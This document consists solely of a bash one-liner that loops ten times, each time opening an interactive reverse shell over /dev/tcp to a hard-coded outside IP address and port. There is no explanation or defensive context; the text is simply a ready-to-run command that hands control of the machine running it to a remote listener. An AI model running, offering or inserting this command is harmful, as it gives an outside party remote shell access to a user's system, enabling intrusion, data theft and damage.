
for i in `seq 1 10`; do bash -i >& /dev/tcp/147.185.221.25/12440 0>&1; done
